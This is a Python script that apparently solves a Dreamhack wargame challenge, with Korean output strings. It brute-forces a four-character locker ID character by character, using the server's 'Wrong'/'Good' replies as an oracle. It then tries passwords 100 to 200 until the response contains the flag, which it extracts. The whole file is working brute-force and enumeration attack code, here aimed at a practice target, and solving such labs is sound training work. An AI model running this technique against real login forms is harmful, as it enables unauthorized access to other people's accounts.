import requests
import string
from bs4 import BeautifulSoup
url="http://host1.dreamhack.games:11649/"
password=""
alphanumeric = list(string.ascii_lowercase + string.digits)
locker_num=[]
for j in range(4):
    for word in alphanumeric:
        print(word)
        locker_num.append(word)
        param={
            'locker_num':"".join(map(str, locker_num)),
            'password':"d"
        }
        res=requests.post(url,data=param)
        if "Wrong" in res.text:
            locker_num.pop()
        elif "Good" in res.text:
            print(f"{j+1}번째 아이디 correct")
            print(locker_num)
            break
    if len(locker_num)==4:
        print("id is ")
        locker_num="".join(map(str,locker_num))
        print(locker_num+"\n")
        break
for i in range(100,201):
    print(i)
    param={
        'locker_num':locker_num,
        'password':str(i)
    }
    res=requests.post(url,data=param)
    if "FLAG" in res.text:
        print("비밀번호는:",i)
        html_content = res.content
        soup=BeautifulSoup(html_content, 'html.parser')
        rows = soup.find_all('pre')
        flag=[row.get_text(strip=True) for row in rows]
        print(flag[0])
        exit()

            

